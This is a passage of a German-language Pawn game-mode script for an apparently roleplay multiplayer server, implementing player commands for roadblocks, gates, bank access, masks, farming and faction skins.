					if(PlayerInfo[i][pMember] == mymember || PlayerInfo[i][pLeader] == myleader)
					{
						GetPlayerName(i, sendername, sizeof(sendername));
						format(string, sizeof(string), "* %s [ID:%d][Rang:%d]", sendername,i,PlayerInfo[i][pRank]);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
				}
			}
			return 1;
		}
		return 1;
	}
*/
	if(strcmp(cmdtext, "/roadunblock", true)==0 || strcmp(cmdtext, "/rrb", true)==0)
	{
		if(!IsACop(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Du bist kein Cop!");
			return 1;
		}
		if (PlayerInfo[playerid][pRank] < 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "Du mußt mindestens Rang 2 haben um diesen Befehl nutzen zu können!");
			return 1;
		}
		if (PlayerInfo[playerid][pRoadblock] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "Du hast keine Straßensperre platziert!");
			return 1;
		}
		RemoveRoadblock(playerid);
		SendClientMessage(playerid, COLOR_GREEN, "Straßensperre erfolgreich entfernt.");
		return 1;
	}

	if(strcmp(cmdtext, "/roadunblockall", true)==0 || strcmp(cmdtext, "/rrball", true)==0)
	{
		if (PlayerInfo[playerid][pRank] >= 4 && PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pAdmin] > 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 2|| PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 3)
		{
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(PlayerInfo[i][pRoadblock] != 0)
				{
					RemoveRoadblock(i);
				}
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "HQ: Durch die Anordnung von Officer %s wurden alle Starßensperren entfernt.", sendername);
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 2)
					{
						SendClientMessage(i, TEAM_BLUE_COLOR, string);
					}
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Du mußt Rang 2 haben oder Polizeichef sein um alle Straßensperren entfernen zu können!");
		}
		return 1;
	}


	if (strcmp("/Menu", cmdtext, true, 10) == 0)
	{
        if(PlayerInfo[playerid][pBizID] == 2||PlayerInfo[playerid][pBizID] == 3||PlayerInfo[playerid][pBizID] == 5)//3 bis 5
        {
		 	if (IsPlayerInRangeOfPoint(playerid,2.0,376.4389,-67.9595,1001.5151)||IsPlayerInRangeOfPoint(playerid,2.0,374.7315,-119.5200,1001.4995)||IsPlayerInRangeOfPoint(playerid,2.0,369.5129,-6.7848,1001.8589)||IsPlayerInRangeOfPoint(playerid,2.0,448.4033,-84.3045,999.5547))
		 	{
				SendClientMessage(playerid, NB, "Wähle bitte dein gewünschtes Essen aus.");
				ShowMenuForPlayer(BSMK, playerid);
				FreezePlayer(playerid);
				return 1;
			}
		}
	}
/*
	if (strcmp("/Menu", cmdtext, true, 10) == 0)
	{
	 	if (IsPlayerInRangeOfPoint(playerid,2.0,374.7315,-119.5200,1001.4995))
	 	{
			SendClientMessage(playerid, NB, "Wähle bitte dein gewünschtes Essen aus.");
			ShowMenuForPlayer(CBKM, playerid);
			FreezePlayer(playerid);
			return 1;
		}
	}
	if (strcmp("/Menu", cmdtext, true, 10) == 0)
	{
	 	if (IsPlayerInRangeOfPoint(playerid,2.0,369.5129,-6.7848,1001.8589))
	 	{
			SendClientMessage(playerid, NB, "Wähle bitte dein gewünschtes Essen aus.");
			ShowMenuForPlayer(PMK, playerid);
			FreezePlayer(playerid);
			return 1;
		}
	}
	if (strcmp("/Menu", cmdtext, true, 10) == 0)
	{
	 	if (IsPlayerInRangeOfPoint(playerid,2.0,448.4033,-84.3045,999.5547))
	 	{
			SendClientMessage(playerid, NB, "Wähle bitte dein gewünschtes Essen aus.");
			ShowMenuForPlayer(PMK, playerid);
			FreezePlayer(playerid);
			return 1;
		}
	}
*/
	if(strcmp(cmdtext, "/maske", true) == 0)
	{
 		if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2|| PlayerInfo[playerid][sMember] == 21)
   		{
			if(Maske[playerid] == 1)
			{
				for(new i = 0; i < MAX_PLAYERS; i++) ShowPlayerNameTagForPlayer(i, playerid, 1);
				Maske[playerid] = 0;
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du hast deine Maske abgenommen.");
			}
			else if(Maske[playerid] == 0)
			{
				for(new i = 0; i < MAX_PLAYERS; i++) ShowPlayerNameTagForPlayer(i, playerid, 0);
				Maske[playerid] = 1;
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "*Du hast deine Maske aufgesetzt.");
			}
		}
		else
		{
  			SendClientMessage(playerid, COLOR_GRAD1, "Du kannst keine Maske aufsetzen!");
		}
		return 1;
	}
	if(strcmp(cmd, "/ernten", true) == 0)
	{
	    if(PlayerInfo[playerid][pJob] != 6)
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Das können nur Farmer!");
	        return 1;
		}
   		new vehicle = GetPlayerVehicleID(playerid);
   		if(AktuellerCP[playerid] != INVALID_FARMER_CP)return SendClientMessage(playerid,COLOR_GRAD1, "Du hast kein Mähdrescher!");
   		if(!FarmerFahrzeug(vehicle))return SendClientMessage(playerid,COLOR_GRAD1, "Du bist in keinem Mähdrescher");
		if(PlayerInfo[playerid][pFarmTime] > 0)return SendClientMessage(playerid, COLOR_GRAD1, "Die Pflanzen sind noch nicht gewachsen!");
		AktuellerCP[playerid]++;
   		SetPlayerCheckpoint(playerid,FarmerCPS[AktuellerCP[playerid]][0],FarmerCPS[AktuellerCP[playerid]][1],FarmerCPS[AktuellerCP[playerid]][2], 8.0);
   		SendClientMessage(playerid,COLOR_LIGHTBLUE, "*Fahre nun die Checkpoints ab, um das Feld abzuernten.");
		return 1;
	}
 	if(strcmp(cmd,"/preise",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
	    	if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
	    	{
		        tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, BLUE_NEW, "Verwende: /preise ID ");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
					    if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
					        SendClientMessage(giveplayerid, RED_NEW, "----------[Preise]----------");
					        SendClientMessage(giveplayerid, RED_NEW, "Führerschein: 3000$");
					        SendClientMessage(giveplayerid, RED_NEW, "Flugschein: 8000$");
					        SendClientMessage(giveplayerid, RED_NEW, "Angelschein: 1000$");
					        SendClientMessage(giveplayerid, RED_NEW, "Bootschein: 5000$");
					        SendClientMessage(giveplayerid, RED_NEW, "LKW: 5000$");
					        SendClientMessage(giveplayerid, RED_NEW, "Motorrad: 4000$");
					        SendClientMessage(giveplayerid, RED_NEW, "Waffenschein: 50000$");
							format(string, sizeof(string), "* Du hast %s die Preise für alle Scheine gezeigt", giveplayer);
							SendClientMessage(playerid, BLUE_NEW, string);
						}
						else
						{
						    SendClientMessage(playerid, BLUE_NEW, "Spieler nicht in ihrer Nähe!");
						    return 1;
						}
					}
				}
		        else
		        {
		            SendClientMessage(playerid, BLUE_NEW, "Spieler Offline");
		            return 1;
		        }
			}
		}
	    return 1;
 	}
    //-------------------------------[ ATM ]---------------------------------------------------
	if(strcmp(cmd, "/iatm", true) == 0)
	{
		if(AtATM(playerid))
 		{
			SendClientMessage(playerid, COLOR_RED, "Die Bankautomaten sind vorübergehend geschlossen!");
			return 1;
 		}
	}
	if(strcmp(cmd, "/atm", true) == 0)
	{
		if(!AtATM(playerid))
 		{
			SendClientMessage(playerid, COLOR_GREY, "Du bist an keinem Bankautomat!");
			return 1;
 		}
        format(string, sizeof(string), "* %s Schiebt seine EC-Karte in den ATM", sendername);
        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
 		ShowPlayerDialog(playerid, BANK, DIALOG_STYLE_LIST,"Menü", "Kontostand\nEinzahlen\nAuszahlen\nÜberweisen\nHandykarten", "Auswählen", "Beenden");
 		return 1;
	}
	if(strcmp(cmd, "/bank",true) == 0)
	{
		if(IsPlayerInRangeOfPoint(playerid,7.0,1421.3022,-981.7219,1639.7843))
		{
		    ShowPlayerDialog(playerid, BANK,DIALOG_STYLE_LIST,"Bank", "Kontostadt\nEinzahlen\nAuszahlen\nÜberweisen", "Auswählen", "Beenden");
		}
		else { SendClientMessage(playerid, COLOR_RED, "Du bist nicht in der Bank"); }
	}

///////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////// TORBEFEHLE  /////////////////////////////////////////


        if (strcmp("/newschranke", cmdtext, true, 10) == 0)
        {
   		if(IsACop(playerid) || IsPlayerInFrac(playerid, 9))
		{
        MoveObjektRot(newschranke, 0.00000, 16.00000, 0.18000,25);
        SetTimer("newschrankeclose",5000,0);
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein San News Member!");
 		return 1;
	    }


/*
        if (strcmp("/freecar", cmdtext, true, 10) == 0)
        {
		if(!IsPlayerInAnyVehicle(playerid))
	    {
 		SendClientMessage(playerid, COLOR_GRAD1, "Du bist in keinen Fahrzeug!");
 		return 1;
	    }
	    if (IsPlayerInRangeOfPoint(playerid, 7.0, 911.9958,-1221.7587,16.9766))
	    {
	         	if(GetPlayerMoneySave(playerid) >= 15000)
	         	{
					new trailercar = GetPlayerVehicleID(playerid);
					if(IsADtCar(trailercar))// Privatfahrzeug
				   	{
	                	new carowner = GetDtCarOwner(trailercar);
	               	    new slot = GetDtCarOwnerSlot(carowner,trailercar);
						PlayerCar[carowner][slot][Abgeschleppt] = 0;
					}
					GivePlayerMoneySave(playerid, -15000);
					FraktionsKasse[23] += 15000;
			        MoveDynamicObject(otor1, 923.48230, -1216.51563, 13.08287,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
			        SetTimer("otor1close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
			        MoveDynamicObject(otor2, 923.47284, -1225.36877, 13.08251,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Die Schranke wurde geöffnet, Vergesse nicht dein Fahrzeug neu zu Parken!");
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld!");
				}
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht bei dem Ordnungsamt!");
 		return 1;
	    }

*/



        if (strcmp("/yakator", cmdtext, true, 10) == 0)
        {
   		if(PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6)
		{
        MoveObject(yakutor, 2518.82227, 1822.89758, 6.96260,4.0);
        SetTimer("yakutorclose",5000,0);
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Yakuzaüter!");
 		return 1;
	    }



        if (strcmp("/otor", cmdtext, true, 10) == 0)
        {
   		if(IsACop(playerid) || IsPlayerInFrac(playerid, 24))
		{
        MoveObjektRot(oamtschranke, 0.00000, 13.50000, 0.00000,25);
        SetTimer("oamtschrankeclose",5000,0);
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Ordnungshüter!");
 		return 1;
	    }

        if (strcmp("/pdd1", cmdtext, true, 10) == 0)
        {
   		if(IsACop(playerid) || IsPlayerInFrac(playerid, 22))
		{
        MoveDynamicObject(pdd1, 239.56374, 118.96767, 1006.86639,2.0);
        SetTimer("pdd1close",5000,0);
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
 		return 1;
	    }

        if (strcmp("/pdd2", cmdtext, true, 10) == 0)
        {
   		if(IsACop(playerid) || IsPlayerInFrac(playerid, 22))
		{
        MoveDynamicObject(pdd2, 253.22673, 109.46581, 1006.89221,2.0);
        SetTimer("pdd2close",5000,0);
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
 		return 1;
	    }

        if (strcmp("/mwtor", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19)
		{
        MoveDynamicObject(RS1, 1283.94921875,-1652.19042969,5.32026672,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("mwtorclose",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else 	SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Red Soldiers!");
 		return 1;
	    }

        if (strcmp("/rtor2", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
	    if(!IsPlayerInFrac(playerid, 5))
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Mitglied der Los Chicken Malos !");
	        return 1;
		}
        MoveDynamicObject(rtor2, 2088.90918, 1433.19250, 18.13639,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("rtor2close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
        return 1;
        }

        if (strcmp("/rtor1", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
	    if(!IsPlayerInFrac(playerid, 5))
	    {
	        SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Mitglied der Los Chicken Malos !");
	        return 1;
		}
        MoveDynamicObject(rtor1, 2107.43579, 1385.12964, 18.19064,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("rtor1close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
        return 1;
        }

        if (strcmp("/lcntor", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][pMember] == 23 || PlayerInfo[playerid][pLeader] == 23)
		{
        MoveDynamicObject(lcntor, 2605.98193, 2302.83960, 7.00819,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("lcntorclose",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Russe!");
 		return 1;
	    }

        if (strcmp("/triadentor", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)
        {
        MoveDynamicObject(yaktor, -2803.43945312,-329.79394531,-2.81245422, 4.0);
        SetTimer("triadentorclose",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Triade!");
 		return 1;
	    }

        if (strcmp("/fixedtor", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)
		{
        MoveDynamicObject(yaktor2, -2655.51562500,-222.05761719,-2.05807400, 4.0);
        SetTimer("triadentor2close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Triade!");
 		return 1;
	    }
        if (strcmp("/whtor", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pLeader] == 21)
		{
 	    MoveDynamicObject(terrorgate,-489.2532043457, -563.72381591797, 20.966348648071,3.0);
        SetTimer("whtorclose",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Wheelman!");
 		return 1;
	    }
        if (strcmp("/schranke2", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][sMember] == 1 || PlayerInfo[playerid][sMember] == 2 || PlayerInfo[playerid][sMember] == 3)
		{
        MoveObjektRot(fbi2222,0.00000, 0.00000, 90.00000,35);
        SetTimer("fbi2222close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
 		return 1;
	    }
        if (strcmp("/schranke1", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][sMember] == 1 || PlayerInfo[playerid][sMember] == 2 || PlayerInfo[playerid][sMember] == 3)
		{
        MoveObjektRot(fbi3333,0.00000, 0.00000, 90.00000,35);
        SetTimer("fbi3333close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
 		return 1;
	    }
        if (strcmp("/bwtor1", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
		{
        MoveDynamicObject(bwtor1, 135.10271, 1941.33716, 14.97026,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("bwtor1close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
 		return 1;
	    }
        if (strcmp("/bwtor2", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
		{
        MoveDynamicObject(bwtor2, 285.61713, 1822.02710, 13.23602,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("bwtor2close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
 		return 1;
	    }
        if (strcmp("/haustor2", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
        if(PlayerInfo[playerid][pHouseKey] == 33)
        {
        MoveDynamicObject(haustor2,  282.38562, -1319.93042, 49.90680,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("haustor2close",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du hast keinen Schlüssel!! Haus 33");
 		return 1;
	    }





		if (strcmp("/gateamk", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
		{
		 if(IsPlayerInRangeOfPoint(playerid, 10.0, 999.36078,-645.45374,120.85107) && (PlayerInfo[playerid][pHouseKey] == 12))
		 {
		  MoveDynamicObject(gateamk, 991.90173, -648.61786, 120.85107, 1.5);
		  SetTimerEx("MoveGateBack", 5000, false, "ifff", gateamk, 999.36078,-645.45374,120.85107);
		  SendClientMessage(playerid, COLOR_GRAD2, "Du hast das Tor von Haus ID: 11 geöffnet.");
		  SendClientMessage(playerid, COLOR_GRAD2, "Es schließt sich in 5 Sekunden wieder.");
		 }
		else
		 {
		  SendClientMessage(playerid, COLOR_GRAD2, "Du hast keinen Schlüssel, Haus ID 12");
			return 1;
		 }
		 return 1;
		}







        if (strcmp("/htor", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)
		{
        MoveDynamicObject(htor, 1879.32593, 702.76483, 18.28656,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("htorclose",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Hitman!");
 		return 1;
	    }
        if (strcmp("/haustor", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
        if(PlayerInfo[playerid][pHouseKey] == 39)
        {
        MoveDynamicObject(haustor, 318.56870, -1190.22119, 75.54530,2.0);//Die 2.0 ist die Geschwindigkeit des Gates!
        SetTimer("haustorclose",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du hast keinen Schlüssel!! 39");
 		return 1;
	    }
        if (strcmp("/lvpdtor", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(IsACop(playerid) || IsPlayerInFrac(playerid, 22))
		{
        MoveDynamicObject(LVPDtorneu,2334.78613, 2443.51074, 11.28341, 4);
        SetTimer("lvpdtorclose",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!"); // LVTOR ZU MoveDynamicObject(LVPDtorneu,2334.78613, 2443.51074, 7.25360, 4);
 		return 1;
	    }
    	if(strcmp(cmd,"/lspdtor", true) == 0)
    	{
	    if(IsACop(playerid) || IsPlayerInFrac(playerid, 22))
		if(IsPlayerInRangeOfPoint(playerid,5.0,246.32, 72.97, 1003.64))
		{
  		MoveDynamicObject(lspdtor,246.44479, 72.60710, 1007.19891, 4);
		SetTimer("torlspd",5000,0);
		}
 		return 1;
    	}
        if (strcmp("/fbi", cmdtext, true, 10) == 0)//den Befehl könnt ihr jederzeit beliebig ändern
        {
   		if(IsACop(playerid) || IsPlayerInFrac(playerid, 22))
		{
        MoveDynamicObject(fbitor, -1631.79822, 688.39423, 13.58666, 4);
        SetTimer("fbihqtorclose",5000,0);//Der Timer wird gestartet sobald der CMD verwendet wird!5000 ist die Zeit in Ms!
		}
 		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
 		return 1;
	}
	if(strcmp(cmd,"/rtor",true) == 0)
	{
	    if(PlayerInfo[playerid][pMember] == 23 || PlayerInfo[playerid][pLeader] == 23)
	    {
	        if(rtorvar == 0)
	        {
	            MoveDynamicObject(rtor,2422.7316894531, -2089.4899902344, 8.257606506348,3.0);
				PlaySoundForPlayer(playerid,1035);
				SetTimerEx("PlaySoundForPlayer",2000,0,"id",playerid,1036);
				rtorvar = 1;
			}
			else
			{
			    MoveDynamicObject(rtor,2422.7316894531, -2089.4899902344, 15.257606506348,3.0);
				PlaySoundForPlayer(playerid,1035);
				SetTimerEx("PlaySoundForPlayer",2000,0,"id",playerid,1036);
			    rtorvar = 0;
			}
		}
  		else SendClientMessage(playerid,COLOR_RED," Du bist kein Mitglied der Russen Mafia");
		return 1;
	}
	if(strcmp(cmd,"/pd1", true) == 0)
	{
	    if(IsACop(playerid) || IsPlayerInFrac(playerid, 22))
	    {
	        MoveDynamicObject(MVTor2, 1592.74524, -1638.13220, 12.45090, 4);
	        SetTimer("CloseMVTor2", 5000, 0);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Cop!");
		return 1;
	}
	if(strcmp(cmd,"/pd2", true) == 0)
	{
	    if(IsACop(playerid) || IsPlayerInFrac(playerid, 22))
	    {
            MoveObjektRot(MVTor3, 0.00000, 0.00000, -90.00000,25);
	        SetTimer("CloseMVTor3", 5000, 0);
//	        SendClientMessage(playerid, COLOR_YELLOW, "Das Hoftor ist offen. Beeil dich es schließt in 5 Sekunden");
		}
		else SendClientMessage(playerid, COLOR_RED, "Du hast nicht die Erlaubnis dazu!");
		return 1;
	}
/*
	if(strcmp(cmd, "/undercover", true) == 0)
	{
 		if(IsPlayerInFrac(playerid, 8))
	    {
           	if(IsPlayerInRangeOfPoint(playerid, 5.0, 2328.1360,569.7377,7.7813))
			{
       			tmp = strtoknew(cmdtext, idx);
          		if(!strlen(tmp))
            	{
             		SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /undercover [Skin Nummer]");
               		SendClientMessage(playerid, COLOR_GRAD1, "*Es gibt 6 Skins (Nummer 1-6");
					return 1;
				}
				new skin = strval(tmp);
				if(skin == 1)
				{
				    SetPlayerSkin(playerid, 127);
				    return 1;
				}
				if(skin == 2)
				{
					SetPlayerSkin(playerid, 28);
				    return 1;
				}
				if(skin == 3)
				{
				    SetPlayerSkin(playerid, 10);
					return 1;
				}
				if(skin == 4)
				{
				    SetPlayerSkin(playerid, 122);
					return 1;
				}
				if(skin == 5)
				{
				    SetPlayerSkin(playerid, 27);
					return 1;
				}
				if(skin == 6)
				{
				    SetPlayerSkin(playerid, 181);
					return 1;
				}
				if(skin <= 0 || skin > 6)
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Skin nicht vorhanden!");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht am Bestellen-Punkt!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Hitman!");
		}
		return 1;
	}
    /////////////////////////////////////////////////////////////////////////////////////////////////////

	if(strcmp(cmd,"/zivil",true) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid,5.0,217.5230,184.4352,1003.0313))
	    {
		    if(IsPlayerInFrac(playerid,1))
		    {
		        if(ZivilSkin[playerid] == 0)
		        {
                    ZivilSkin[playerid] = 1;
                    SetPlayerSkin(playerid,188);
                    SetPlayerColor(playerid,TEAM_HIT_COLOR);
                    SendClientMessage(playerid,COLOR_WHITE," Du hast dich vom Dienst abgemeldet!");
                }
				else
		        {
                    ZivilSkin[playerid] = 0;
                    SetPlayerColor(playerid,NAMECOLOR_LSCOP);
                    SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
                    SendClientMessage(playerid,COLOR_WHITE," Du hast dich zum Dienst gemeldet!");
                }
		    }
		    else if(IsPlayerInFrac(playerid,2))
		    {
		        if(ZivilSkin[playerid] == 0)
		        {
                    ZivilSkin[playerid] = 1;
                    SetPlayerSkin(playerid,186);
                    SendClientMessage(playerid,COLOR_WHITE," Du hast dich zivil gekleidet!");
                }
				else
		        {
                    ZivilSkin[playerid] = 0;
                    SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
                    SendClientMessage(playerid,COLOR_WHITE," Du hast dich dienstlich gekleidet!");
                }
		    }
			else if(IsPlayerInFrac(playerid,3))
		    {
		        if(ZivilSkin[playerid] == 0)
		        {
                    ZivilSkin[playerid] = 1;
                    SetPlayerSkin(playerid,299);
                    SendClientMessage(playerid,COLOR_WHITE," Du hast dich zivil gekleidet!");
                }
				else
		        {
                    ZivilSkin[playerid] = 0;
                    SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
                    SendClientMessage(playerid,COLOR_WHITE," Du hast dich dienstlich gekleidet!");
                }
		    }
	        else if(IsPlayerInFrac(playerid,21))
		    {
		        if(ZivilSkin[playerid] == 0)
		        {
                    ZivilSkin[playerid] = 1;
                    SetPlayerSkin(playerid,217);
                    SendClientMessage(playerid,COLOR_WHITE," Du hast dich zivil gekleidet!");
                }
				else
		        {
                    ZivilSkin[playerid] = 0;
                    SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
                    SendClientMessage(playerid,COLOR_WHITE," Du hast dich dienstlich gekleidet!");
                }
		    }
		    else
		    {
		        SendClientMessage(playerid,COLOR_WHITE," Du bist nicht berechtigt diesen Befehl zu nutzen!");
		    }
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_WHITE," Du bist nicht am Kleidungspunkt!");
	    }
	    return 1;
	}
*/
	if(strcmp(cmd,"/coords",true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 1330)
	    {
	        new Float:xcoord, Float:ycoord, Float:zcoord, Float:angle;
	        GetPlayerPos(playerid,xcoord,ycoord,zcoord);
	        GetPlayerFacingAngle(playerid,angle);
			format(string,sizeof(string)," Dein Koordinaten:  X %f   Y %f   Z %f   A %f ",xcoord,ycoord,zcoord,angle);
			SendClientMessage(playerid,COLOR_YELLOW,string);
		}
		return 1;
	}
/*
	if(strcmp(cmd,"/gotocoords",true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 1330)
	    {
			new coordstr[3][24], Float:coords[3];
			tmp = strtoknew(cmdtext, idx);
	        if(!strlen(tmp)) return SendClientMessage(playerid,COLOR_WHITE," /gotocoords X,Y,Z");
	        //if(strfind(tmp,",",true) != 0) return SendClientMessage(playerid,COLOR_WHITE," Koordinaten mit Kommata trennen und ohne Leerzeichen!");
			split2(tmp,coordstr,',');
			coords[0] = floatstr(coordstr[0]);
			coords[1] = floatstr(coordstr[1]);
			coords[2] = floatstr(coordstr[2]);
			SetPlayerPos(playerid,coords[0],coords[1],coords[2]);
			format(string,sizeof(string)," Erfolgreich teleportiert:  X %f   Y %f   Z %f",coords[0],coords[1],coords[2]);
			SendClientMessage(playerid,COLOR_YELLOW,string);
		}
		return 1;
	}
*/
